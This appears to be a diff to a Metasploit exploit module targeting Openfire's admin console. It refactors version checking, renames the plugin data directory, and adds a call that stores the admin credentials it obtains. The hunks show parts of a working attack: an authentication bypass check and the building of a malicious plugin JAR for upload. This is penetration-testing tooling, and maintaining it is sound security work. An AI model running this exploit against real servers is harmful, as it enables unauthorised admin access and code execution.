@@ -79,7 +79,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
   def get_version
     # get Openfire version number from the admin console login page
-    openfire = {}
+    openfire_version = nil
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'login.jsp'),
@@ -87,9 +87,10 @@ class MetasploitModule < Msf::Exploit::Remote
     })
     if res && res.code == 200
       version = res.body.match(/Openfire,\s*\D*:\s*\d\.\d{1,2}\.\d/)
-      openfire['version'] = version[0].split(':')[1].strip unless version.nil?
+      openfire_version = Rex::Version.new(version[0].split(':')[1].strip) unless version.nil?
     end
-    return openfire
+
+    openfire_version
   end
 
   def auth_bypass
@@ -162,6 +163,7 @@ class MetasploitModule < Msf::Exploit::Remote
       }
     })
     if res && res.code == 200 && res.body.match(/login box/).nil?
+      store_valid_credential(user: @admin_login['username'], private: @admin_login['password'], proof: cookie_jar.cookies)
       return true
     else
       return false
@@ -179,13 +181,13 @@ class MetasploitModule < Msf::Exploit::Remote
     ]
 
     jar = Rex::Zip::Jar.new
-    jar.add_files(files, File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-32315'))
+    jar.add_files(files, File.join(Msf::Config.data_directory, 'exploits', 'openfire_plugin'))
 
     @plugin_name = datastore['PLUGINNAME'] || Rex::Text.rand_text_alphanumeric(8..15)
     plugin_author = datastore['PLUGINAUTHOR'] || Rex::Text.rand_text_alphanumeric(8..15)
     plugin_desc = datastore['PLUGINDESC'] || Rex::Text.rand_text_alphanumeric(8..15)
 
-    plugin_xml = File.binread(File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-32315', 'plugin.xml'))
+    plugin_xml = File.binread(File.join(Msf::Config.data_directory, 'exploits', 'openfire_plugin', 'plugin.xml'))
     plugin_xml.gsub!(/PLUGINNAME/, @plugin_name)
     plugin_xml.gsub!(/PLUGINDESCRIPTION/, plugin_desc)
     plugin_xml.gsub!(/PLUGINAUTHOR/, plugin_author)
@@ -229,17 +231,17 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def check
-    openfire = get_version
-    return CheckCode::Safe if openfire.empty?
+    openfire_version = get_version
+    return CheckCode::Safe if openfire_version.nil?
     # check first for patched versions
-    return CheckCode::Safe("Openfire version is #{openfire['version']}") if Rex::Version.new(openfire['version']) == Rex::Version.new('4.6.8')
-    return CheckCode::Safe("Openfire version is #{openfire['version']}") if Rex::Version.new(openfire['version']) == Rex::Version.new('4.7.5')
-    return CheckCode::Safe("Openfire version is #{openfire['version']}") if Rex::Version.new(openfire['version']) == Rex::Version.new('4.8.0')
+    return CheckCode::Safe("Openfire version is #{openfire_version}") if openfire_version == Rex::Version.new('4.6.8')
+    return CheckCode::Safe("Openfire version is #{openfire_version}") if openfire_version == Rex::Version.new('4.7.5')
+    return CheckCode::Safe("Openfire version is #{openfire_version}") if openfire_version == Rex::Version.new('4.8.0')
 
-    if Rex::Version.new(openfire['version']) < Rex::Version.new('4.8.0') && Rex::Version.new(openfire['version']) >= Rex::Version.new('3.10.0')
-      CheckCode::Vulnerable("Openfire version is #{openfire['version']}")
+    if openfire_version < Rex::Version.new('4.8.0') && openfire_version >= Rex::Version.new('3.10.0')
+      CheckCode::Appears("Openfire version is #{openfire_version}")
     else
-      CheckCode::Safe("Openfire version is #{openfire['version']}")
+      CheckCode::Safe("Openfire version is #{openfire_version}")
     end
   end
 
